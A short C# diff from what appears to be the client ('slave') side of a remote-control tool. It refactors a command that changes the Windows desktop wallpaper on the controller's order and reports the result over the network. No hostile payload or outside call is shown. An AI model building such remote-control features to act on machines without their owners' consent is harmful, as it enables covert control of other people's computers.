@@ -1,8 +1,8 @@
 ﻿using Shared;
-using Slave.Commands.Core;
 using System.Collections.Generic;
 using System.IO;
 using System.Runtime.InteropServices;
+using Slave.Core;
 
 namespace Slave.Commands
 {
@@ -16,14 +16,14 @@ namespace Slave.Commands
 
             if (!File.Exists(filename))
             {
-                SlaveCommandsManager.networkManager.WriteLine("FileError");
+                SlaveNetworkManager.GetInstance().WriteLine("FileError");
                 return;
             }
             var fileInfo = new FileInfo(filename);
 
             SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, fileInfo.FullName, SPIF_UPDATEINIFILE | SPIF_SENDCHANGE);
 
-            SlaveCommandsManager.networkManager.WriteLine("OK");
+            SlaveNetworkManager.GetInstance().WriteLine("OK");
         }
 
         [DllImport("user32.dll", CharSet = CharSet.Auto)]
